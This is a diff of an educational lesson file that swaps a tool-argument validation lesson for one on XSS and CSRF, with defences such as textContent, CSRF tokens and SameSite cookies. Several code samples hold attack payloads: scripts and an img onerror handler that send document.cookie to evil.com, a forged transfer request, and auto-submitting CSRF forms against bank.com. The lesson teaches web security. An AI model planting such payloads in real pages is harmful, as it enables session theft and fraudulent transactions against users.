@@ -3,82 +3,116 @@ import type { LessonData } from "../types";
 const content: LessonData = {
   num: 15,
   orderIndex: 6,
-  phaseLabel: "STRUCTURED OUTPUTS + TOOL CALLING",
-  title: "Trust But Verify: Validating Arguments Before You Call the Tool",
+  phaseLabel: "SECURITY + AUTH PATTERNS",
+  title: "Two ways to abuse a logged-in browser: XSS and CSRF",
   minutes: 20,
   concept:
-    "A JSON schema tells the model what shape its arguments are supposed to be, but naming the shape doesn't enforce it — nothing stops the model from returning a tool_call whose arguments dict is missing a required key, or whose value is a kind the tool simply doesn't support, even though it looks like a perfectly reasonable string or number. An earlier lesson showed catching the crash after the real tool already blew up on bad input; that's a safety net, not a filter. The better fix is a small validate_args function that checks the exact same rules the schema promised — every required key present, every value inside whatever set the tool actually handles — and raises one clear, specific error the instant something's off, before the real function ever runs. That ordering matters most when the real tool has side effects you can't undo: charging a card, sending an email, canceling a flight. Validating first means a bad call never reaches that code at all. And a rejection doesn't have to be a dead end — you can feed the validation error back into the conversation as if it were a tool result, ask the model to try again, and let it correct its own arguments. That's what a retry loop is: the same messages-list mechanism from before, just with a validation failure sitting in the tool result instead of a real one.",
+    "Cross-Site Scripting (XSS) happens when an attacker gets their own code injected into content that your app later renders as real HTML on someone else's page. If a comments section stores whatever a user typed and later does commentEl.innerHTML = comment, the browser doesn't display that comment as text — it parses it as HTML and executes anything it finds, including a <script> tag. That means a comment like \"<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>\" runs inside the browser of every single person who views the page, using that page's own origin — which lets it read cookies, make authenticated requests as that victim, or rewrite the page entirely. This is why it matters whether the injected content came from a database (stored XSS, served to every future visitor) or was reflected straight back from something like a URL parameter (reflected XSS, affecting only whoever clicks a crafted link) — either way, the fix is the same: never let user-controlled text become HTML that the browser parses. Assigning it to textContent instead of innerHTML, or running it through a proper sanitizer/escaper, makes the browser treat \"<script>\" as the literal four-teen characters it is rather than as a tag to execute. Cross-Site Request Forgery (CSRF) is a completely different mechanism that happens to target the same kind of victim: someone who's already logged into a real site. A malicious page — hosted anywhere, with no injection into the real site required at all — includes a form (often invisible) that targets that real site's endpoint, and auto-submits itself the moment the victim's browser loads the malicious page. Because browsers automatically attach a site's cookies to any request sent to that site, regardless of which page triggered the request, the real site sees what looks like a completely legitimate, authenticated request and processes it — transferring money, changing an email, whatever the form was built to do. The classic defense is a CSRF token: the real site embeds a random, unpredictable value in its own forms and requires that exact value to come back on submission. An attacker's page on a different origin has no way to read or guess that token, because it was never loaded from the real site in the first place, so its forged request gets rejected. Modern apps add a second layer on top of tokens: marking session cookies SameSite=Lax or SameSite=Strict, which tells the browser not to attach that cookie to requests originating from another site at all.",
   conceptSimpler:
-    "validate_args is a bouncer checking IDs and the dress code at the door, instead of a bouncer standing inside who only notices a problem after a fight has already broken out.",
+    "XSS is like someone sneaking a fake announcement onto a bulletin board everyone trusts, so anyone who reads it unknowingly follows the attacker's instructions instead of the real ones. CSRF is like a con artist mailing you a form that's already addressed and stamped to your own bank, betting the bank will process it automatically the moment it arrives — without ever asking whether you actually meant to send it.",
   vizStages: [
     {
-      label: "1. A schema is a promise, not a guarantee",
+      label: "1. XSS: injecting code into someone else's page",
       body:
-        "The schema said currency must be one of a fixed list — but nothing forces the model's actual output to obey that at runtime. This call looks well-formed and still breaks the contract.",
+        "A comment field stores whatever the user typed, and the page later inserts it directly into the DOM with innerHTML. The browser doesn't know this text is untrusted — it just parses it as real HTML.",
       code:
-        "call = {\"name\": \"convert_currency\", \"arguments\": {\"amount\": 100, \"currency\": \"JPY\"}}\nargs = call[\"arguments\"]\nprint(args[\"currency\"])",
+        "const comment = \"<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>\";\ncommentEl.innerHTML = comment;\n// the browser parses this as an actual <script> tag and RUNS it",
     },
     {
-      label: "2. validate_args checks the rules before anything real runs",
+      label: "2. The victim's browser runs the attacker's code",
       body:
-        "Required keys are checked with try/except around the lookup itself, and the allowed-values check is a loop, since there's no built-in \"is this in the list\" shortcut here — either failure raises the same kind of error: ValueError.",
+        "When another visitor simply loads the page containing this stored comment, their browser executes the script as if it were part of the trusted page — because, as far as the browser is concerned, it is part of the page.",
       code:
-        "def validate_args(args):\n    try:\n        amount = args[\"amount\"]\n        currency = args[\"currency\"]\n    except KeyError as e:\n        raise ValueError(f\"missing required argument: {e}\")\n    allowed = [\"USD\", \"EUR\", \"GBP\"]\n    ok = False\n    for c in allowed:\n        if c == currency:\n            ok = True\n    if not ok:\n        raise ValueError(f\"unsupported currency: {currency}\")",
+        "// runs inside the VICTIM's browser tab, under the site's own origin\nfetch(\"https://evil.com/steal?c=\" + document.cookie);\n// or, worse, silently acts on the victim's behalf:\nfetch(\"/api/transfer\", { method: \"POST\", body: JSON.stringify({ to: \"attacker\", amount: 500 }) });",
     },
     {
-      label: "3. A bad call is rejected before it ever touches the real tool",
+      label: "3. The fix: never let user input become executable HTML",
       body:
-        "convert_currency never even gets called here — validate_args raises first, so the rejection happens before any real work, real API call, or real side effect could start.",
+        "Assigning the same string to textContent instead of innerHTML tells the browser to display the literal characters, not parse them as elements — so a <script> tag just shows up as visible text and never runs.",
       code:
-        "args = {\"amount\": 100, \"currency\": \"JPY\"}\ntry:\n    validate_args(args)\n    print(\"arguments look valid\")\nexcept ValueError as e:\n    print(f\"rejected: {e}\")",
+        "// vulnerable\ncommentEl.innerHTML = comment;\n\n// fixed — renders as plain text, never parsed as HTML\ncommentEl.textContent = comment;\n// the page now visibly shows \"<script>...</script>\" instead of running it",
     },
     {
-      label: "4. A rejection can become a retry instead of a dead end",
+      label: "4. CSRF: spending trust the browser already has",
       body:
-        "Instead of just giving up, package the validation error as a tool result the model can actually read, marked as failed. Sent back into the conversation, it gives the model a real chance to correct its own arguments on the next turn.",
+        "XSS runs attacker code inside the site's own origin. CSRF doesn't inject anything into the real site at all — it abuses the fact that browsers automatically attach a site's cookies to any request sent there, no matter which page triggered it.",
       code:
-        "messages.append({\"role\": \"tool\", \"ok\": False, \"content\": \"unsupported currency: JPY\"})\n# the next call to the model sees ok: False and can retry with a supported currency",
+        "<!-- hosted on evil.com, visited by someone already logged into bank.com -->\n<form action=\"https://bank.com/transfer\" method=\"POST\" id=\"f\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker-account\">\n  <input type=\"hidden\" name=\"amount\" value=\"5000\">\n</form>\n<script>document.getElementById(\"f\").submit();</script>\n<!-- the browser attaches bank.com's session cookie automatically -->",
+    },
+    {
+      label: "5. A CSRF token closes the gap",
+      body:
+        "The real bank.com form embeds a random token the server generated and remembers for this session. The server rejects any transfer request missing the exact matching token — and evil.com has no way to read or guess it, since it was never loaded from bank.com.",
+      code:
+        "<!-- legitimate form, served by bank.com itself -->\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"a92f0e...e91c\">\n  ...\n</form>\n// server: reject unless csrf_token matches the one issued for this user's session",
     },
   ],
   realWorldIntro:
-    "Production tool-calling frameworks — and MCP servers in particular — commonly run every incoming tool_call's arguments through a JSON Schema validator before the tool's real code ever executes, precisely so a malformed call never reaches code with side effects. Many go a step further and automatically feed the validation error back to the model as the tool's result, giving it one or more chances to self-correct before the request is given up on entirely.",
+    "In 2005, a MySpace user named Samy Kamkar exploited a stored XSS hole in profile pages to inject a self-propagating script; anyone who merely viewed his profile had the same script silently copied onto their own profile too, quietly adding \"samy is my hero\" and Samy as a friend. Within about 20 hours it had spread to over a million profiles and forced MySpace offline to contain it — a stark demonstration that with stored XSS, simply viewing a page is enough to get infected, no click required.",
   realWorldCode:
-    "def call_tool_safely(name, args):\n    try:\n        validate_args(args)\n    except ValueError as e:\n        return {\"ok\": False, \"error\": str(e)}\n    amount = args[\"amount\"]\n    currency = args[\"currency\"]\n    result = convert_currency(amount, currency)\n    return {\"ok\": True, \"result\": result}",
+    "// the general pattern that made the Samy worm possible: unsanitized profile fields rendered as raw HTML\nprofileHtmlEl.innerHTML = user.aboutMeField; // whatever the user typed becomes real, running HTML\n\n// the fix adopted industry-wide since: sanitize or escape before ever inserting into the DOM\nprofileHtmlEl.textContent = user.aboutMeField; // or run it through an allowlist-based sanitizer first",
   sandbox: {
-    kind: "code",
-    challenge:
-      "Write validate_args(args) that requires \"amount\" and \"currency\" to both be present and requires currency to be one of \"USD\", \"EUR\", or \"GBP\", raising ValueError otherwise. Then run three attempts through it — one with an unsupported currency, one with a missing currency, and one that's actually valid — and print the outcome of each.",
-    starterCode:
-      "def convert_currency(amount, currency):\n    if currency == \"USD\":\n        return amount\n    elif currency == \"EUR\":\n        return amount * 0.92\n    elif currency == \"GBP\":\n        return amount * 0.79\n    else:\n        raise ValueError(f\"unsupported currency: {currency}\")\n\ndef validate_args(args):\n    try:\n        amount = args[\"amount\"]\n        currency = args[\"currency\"]\n    except KeyError as e:\n        raise ValueError(f\"missing required argument: {e}\")\n    allowed = [\"USD\", \"EUR\", \"GBP\"]\n    ok = False\n    for c in allowed:\n        if c == currency:\n            ok = True\n    if not ok:\n        raise ValueError(f\"unsupported currency: {currency}\")\n\ndef try_convert(args):\n    try:\n        validate_args(args)\n    except ValueError as e:\n        return {\"ok\": False, \"error\": e}\n    amount = args[\"amount\"]\n    currency = args[\"currency\"]\n    result = convert_currency(amount, currency)\n    return {\"ok\": True, \"result\": result}\n\nfirst_attempt = {\"amount\": 100, \"currency\": \"JPY\"}\noutcome1 = try_convert(first_attempt)\nif outcome1[\"ok\"]:\n    print(\"converted:\", outcome1[\"result\"])\nelse:\n    print(\"attempt 1 rejected:\", outcome1[\"error\"])\n\nsecond_attempt = {\"amount\": 50}\noutcome2 = try_convert(second_attempt)\nif outcome2[\"ok\"]:\n    print(\"converted:\", outcome2[\"result\"])\nelse:\n    print(\"attempt 2 rejected:\", outcome2[\"error\"])\n\nthird_attempt = {\"amount\": 100, \"currency\": \"EUR\"}\noutcome3 = try_convert(third_attempt)\nif outcome3[\"ok\"]:\n    print(\"converted:\", outcome3[\"result\"])\nelse:\n    print(\"attempt 3 rejected:\", outcome3[\"error\"])",
+    kind: "explore",
+    instructions:
+      "Click through each stage to compare what an attacker actually needs to pull off an XSS attack versus a CSRF attack — and what specifically stops each one.",
+    stages: [
+      {
+        label: "What XSS requires",
+        body:
+          "The attacker needs to get their payload INTO content the site will later render as HTML for someone else — a comment field, a profile bio, or even a URL parameter the page echoes back unescaped.",
+        code:
+          "// stored XSS: payload saved in the database, served to every future viewer\ndb.comments.create({ text: \"<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>\" });\n\n// reflected XSS: payload comes from the URL itself, echoed straight back into the page\n// https://framis.dev/search?q=<script>...</script>\n// page renders: \"Results for <script>...</script>\" -> the script runs",
+      },
+      {
+        label: "What CSRF requires",
+        body:
+          "The attacker needs the victim to already be logged in somewhere, and to load a page the attacker controls — no injection into the target site needed at all.",
+        code:
+          "<!-- attacker only needs the victim's browser to load this -->\n<img src=\"https://bank.com/transfer?to=attacker&amount=5000\">\n<!-- if bank.com allows state changes via GET, loading this image alone submits it -->",
+      },
+      {
+        label: "Defending against XSS: escape or sanitize, always",
+        body:
+          "Never assign untrusted text to innerHTML. Use textContent for plain text, or run any HTML you must allow through a strict allowlist-based sanitizer that strips scripts and event handlers.",
+        code:
+          "// vulnerable\ncommentEl.innerHTML = userComment;\n\n// safe\ncommentEl.textContent = userComment;",
+      },
+      {
+        label: "Defending against CSRF: tokens plus SameSite cookies",
+        body:
+          "Beyond a per-request CSRF token, marking the session cookie SameSite=Strict or SameSite=Lax tells the browser not to attach it to requests that originate from another site at all — blocking most CSRF attempts before a token is even checked.",
+        code:
+          "res.cookie(\"sid\", sessionId, { httpOnly: true, secure: true, sameSite: \"strict\" });\n// this cookie is now withheld from requests initiated by other sites",
+      },
+    ],
   },
   quizQuestion:
-    "convert_currency prints \"contacting currency exchange for ...\" as its very first line, before doing any real conversion. This call validates first. Does that print statement run for a GBP request when validate_args only allows USD and EUR?",
+    "A comments page inserts each comment directly into the DOM like this. Which attack does this make possible, and why?",
   quizCode:
-    "def convert_currency(amount, currency):\n    print(\"contacting currency exchange for\", currency)\n    if currency == \"USD\":\n        return amount\n    elif currency == \"EUR\":\n        return amount * 0.92\n    else:\n        raise ValueError(f\"unsupported currency: {currency}\")\n\ndef validate_args(args):\n    allowed = [\"USD\", \"EUR\"]\n    currency = args[\"currency\"]\n    ok = False\n    for c in allowed:\n        if c == currency:\n            ok = True\n    if not ok:\n        raise ValueError(f\"unsupported currency: {currency}\")\n\nargs = {\"amount\": 100, \"currency\": \"GBP\"}\n\ntry:\n    validate_args(args)\n    amount = args[\"amount\"]\n    currency = args[\"currency\"]\n    result = convert_currency(amount, currency)\n    print(\"result:\", result)\nexcept ValueError as e:\n    print(f\"rejected before calling the tool: {e}\")",
+    "const comment = getUserComment(); // e.g. \"<script>alert(document.cookie)</script>\"\ncommentEl.innerHTML = comment;",
   quizOptions: [
     {
       key: "a",
-      label:
-        "No — validate_args raises ValueError for GBP before convert_currency is ever called, so its print line never runs at all",
-      correct: true,
-    },
-    {
-      key: "b",
-      label: "Yes — the print statement always runs first because Python evaluates function bodies before checking try/except",
+      label: "CSRF — because the comment could contain a form that silently submits itself to another site",
       correct: false,
     },
     {
+      key: "b",
+      label: "XSS — innerHTML makes the browser parse and execute the injected HTML/script as if it were part of the trusted page",
+      correct: true,
+    },
+    {
       key: "c",
-      label: "Yes — validate_args only checks required keys, not which currencies are allowed, so convert_currency still gets called",
+      label: "Neither — innerHTML only changes the visual styling of an element, it can't execute code",
       correct: false,
     },
   ],
   quizFeedbackCorrect:
-    "Right — validate_args loops over the allowed list, finds no match for \"GBP\", and raises ValueError right there. The try block stops at that line and jumps straight to except, so convert_currency — and its print side effect — never executes at all. That's the entire point of validating first: a rejected call never reaches code that does real work.",
+    "Right — innerHTML tells the browser \"parse this string as real HTML,\" so a <script> tag (or an onerror handler, or any other executable payload) hidden inside a comment runs with the exact same trust and access as the rest of the page. textContent, or a proper sanitizer, is what prevents this.",
   quizFeedbackIncorrect:
-    "Not quite — validate_args's for-loop checks currency against the allowed list and finds no match for \"GBP\", so it raises ValueError immediately. That exception jumps straight out of the try block to except, which means convert_currency — including its print line — is never reached for this call.",
+    "Not quite — this is XSS. innerHTML makes the browser parse the string as real HTML rather than treat it as inert text, so any script tags or event handlers hidden inside the comment execute with the page's full trust. CSRF is a separate attack that doesn't require injecting anything into this site at all.",
   takeaway:
-    "A schema describes what the model's arguments should look like; validate_args is what actually enforces it, checking required keys and allowed values before the real tool runs at all. Validating first — instead of just catching the crash afterward — means a bad call never touches code with real side effects, and a validation failure can be handed back to the model as a chance to retry instead of a dead end.",
+    "XSS smuggles executable code into a page so it runs inside a victim's own trusted session — the fix is to never render unsanitized user input as HTML. CSRF abuses the fact that browsers auto-attach cookies to any request regardless of which page triggered it — the fix is unpredictable CSRF tokens plus SameSite cookies. Different mechanisms, same root cause: trusting something without verifying it actually came from where you think.",
 };
 
 export default content;
